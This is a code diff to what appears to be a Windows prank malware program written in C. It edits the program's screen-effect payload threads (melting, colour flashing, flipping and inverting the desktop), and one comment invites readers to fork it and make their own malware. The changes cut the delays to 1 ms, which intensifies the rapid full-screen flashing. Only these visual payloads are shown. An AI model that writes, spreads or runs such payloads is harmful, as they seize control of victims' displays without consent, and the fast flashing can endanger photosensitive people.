@@ -687,30 +687,10 @@ DWORD WINAPI Melter(LPVOID lpstart) {
 		int size = random() % 300 + 200;
 		int rnd = random() % 50 + 30;
 
-		if (sel == 1) {
-			for (int i = 0; i < rnd; i += 10) {
-				BitBlt(hdc, xs + i, ys + i, size + xs, size + ys, hdc, xs, ys, SRCCOPY);
-				Sleep(1);
-			}
-		}
-		else if (sel == 2) {
-			for (int i = 0; i < rnd; i += 10) {
-				BitBlt(hdc, xs + i, ys - i, size + xs, size + ys, hdc, xs, ys, SRCCOPY);
-				Sleep(1);
-			}
-		}
-		else if (sel == 3) {
-			for (int i = 0; i < rnd; i += 10) {
-				BitBlt(hdc, xs - i, ys + i, size + xs, size + ys, hdc, xs, ys, SRCCOPY);
-				Sleep(1);
-			}
-		}
-		else if (sel == 4) {
-			for (int i = 0; i < rnd; i += 10) {
-				BitBlt(hdc, xs - i, ys - i, size + xs, size + ys, hdc, xs, ys, SRCCOPY);
-				Sleep(1);
-			}
-		}
+		if (sel == 1) {for (int i = 0; i < rnd; i += 10) {BitBlt(hdc, xs + i, ys + i, size + xs, size + ys, hdc, xs, ys, SRCCOPY);Sleep(1);}}
+		else if (sel == 2) {for (int i = 0; i < rnd; i += 10) {BitBlt(hdc, xs + i, ys - i, size + xs, size + ys, hdc, xs, ys, SRCCOPY);Sleep(1);}}
+		else if (sel == 3) {for (int i = 0; i < rnd; i += 10) {BitBlt(hdc, xs - i, ys + i, size + xs, size + ys, hdc, xs, ys, SRCCOPY);Sleep(1);}}
+		else if (sel == 4) {for (int i = 0; i < rnd; i += 10) {BitBlt(hdc, xs - i, ys - i, size + xs, size + ys, hdc, xs, ys, SRCCOPY);Sleep(1);}}
 	}
 }
 
@@ -828,14 +808,10 @@ DWORD WINAPI Colors(LPVOID lpstart) {
 		int color = (random() % 2) ? 0x666666 : 0x999999;
 //									   funni	  funni
 
-		BitBlt(hdc, 1, 1, x, y, hdc, 0, 0, color);
-		Sleep(4);
-		BitBlt(hdc, -1, 1, x, y, hdc, 0, 0, color);
-		Sleep(4);
-		BitBlt(hdc, 1, -1, x, y, hdc, 0, 0, color);
-		Sleep(4);
-		BitBlt(hdc, -1, -1, x, y, hdc, 0, 0, color);
-		Sleep(4);
+		BitBlt(hdc, 1, 1, x, y, hdc, 0, 0, color);Sleep(1);
+		BitBlt(hdc, -1, 1, x, y, hdc, 0, 0, color);Sleep(1);
+		BitBlt(hdc, 1, -1, x, y, hdc, 0, 0, color);Sleep(1);
+		BitBlt(hdc, -1, -1, x, y, hdc, 0, 0, color);Sleep(1);
 	}
 }
 
@@ -846,10 +822,8 @@ DWORD WINAPI Flip(LPVOID lpstart) {
 	HDC hdc = GetDC(0);
 
 	while (true) {
-		StretchBlt(hdc, 0, 0, x, y, hdc, x, 0, -x, y, SRCCOPY);
-		Sleep(10);
-		StretchBlt(hdc, 0, 0, x, y, hdc, 0, y, x, -y, SRCCOPY);
-		Sleep(10);
+		StretchBlt(hdc, 0, 0, x, y, hdc, x, 0, -x, y, SRCCOPY);Sleep(1);
+		StretchBlt(hdc, 0, 0, x, y, hdc, 0, y, x, -y, SRCCOPY);Sleep(1);
 	}
 }
 
@@ -870,8 +844,7 @@ DWORD WINAPI CircleSquare(LPVOID lpstart) {
 				HRGN circle = CreateEllipticRgn(xs - i, ys - i, xs + i, ys + i);
 				SelectClipRgn(hdc, circle);
 
-				BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, NOTSRCCOPY);
-				Sleep(1);
+				BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, NOTSRCCOPY);Sleep(1);
 			}
 		}
 		else {
@@ -879,8 +852,7 @@ DWORD WINAPI CircleSquare(LPVOID lpstart) {
 				HRGN square = CreateRectRgn(xs - i, ys - i, xs + i, ys + i);
 				SelectClipRgn(hdc, square);
 
-				BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, NOTSRCCOPY);
-				Sleep(1);
+				BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, NOTSRCCOPY);Sleep(1);
 			}
 		}
 		Sleep(1);
@@ -2076,9 +2048,8 @@ void startPayloads() {
     
     Btw yea you can fork this and make you own malware just pls follow
     the LICENSE file on the GitHub ;)
-    
-    (called by stuff.h)
     */
+
 	HANDLE thread;
 	DWORD ID;
     mciSendString(L"play start.mp3", NULL, 0, NULL);
